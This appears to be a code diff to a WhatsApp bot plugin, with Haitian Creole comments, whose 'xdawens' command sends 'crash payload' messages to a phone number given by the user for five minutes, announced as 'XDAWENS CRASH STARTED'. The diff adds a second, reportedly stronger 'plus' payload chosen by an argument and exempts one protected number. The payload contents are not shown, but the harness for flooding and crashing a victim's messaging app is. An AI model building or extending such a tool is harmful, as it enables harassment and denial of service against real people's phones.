@@ -1,6 +1,7 @@
 const { cmd } = require('../command');
 const config = require('../config');
-const bugchat = require('../bug/izuka6.js'); // Pi fò crash payload
+const bugchat = require('../bug/izuka6.js');      // Payload prensipal (pi fò)
+const bugchatPlus = require('../bug/izuka6plus.js'); // Payload dezyèm, pi puisan
 
 cmd({
   pattern: 'xdawens',
@@ -21,7 +22,9 @@ cmd({
     const protectedNumbers = ['13058962443'];
 
     const body = m.body || '';
-    const cmdName = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase() : '';
+    const cmdName = body.startsWith(prefix)
+      ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
+      : '';
     if (cmdName !== 'xdawens') return;
 
     if (!allowedUsers.includes(senderId)) {
@@ -30,10 +33,11 @@ cmd({
 
     const args = body.trim().split(/\s+/).slice(1);
     const targetNumber = args[0];
+    const usePlusPayload = args.includes('plus'); // Si user ajoute "plus" nan args, itilize payload plus
 
     if (!targetNumber || isNaN(targetNumber)) {
       return await bot.sendMessage(from, {
-        text: `❌ Usage:\n${prefix}xdawens <number>`
+        text: `❌ Usage:\n${prefix}xdawens <number> [plus]`
       }, { quoted: mek });
     }
 
@@ -44,10 +48,10 @@ cmd({
     }
 
     const targetJid = `${targetNumber}@s.whatsapp.net`;
-    const payloadLines = bugchat.split('\n').filter(Boolean);
+    const payloadLines = (usePlusPayload ? bugchatPlus : bugchat).split('\n').filter(Boolean);
 
     await bot.sendMessage(from, {
-      text: `💀 *XDAWENS CRASH STARTED*\n🎯 Target: +${targetNumber}\n🕒 Duration: 5 minutes\n\n📤 Sending...`,
+      text: `💀 *XDAWENS CRASH STARTED*\n🎯 Target: +${targetNumber}\n🕒 Duration: 5 minutes\n\n📤 Sending ${usePlusPayload ? 'PLUS' : 'STANDARD'} payload...`,
     }, { quoted: mek });
 
     const endTime = Date.now() + 5 * 60 * 1000; // 5 minutes
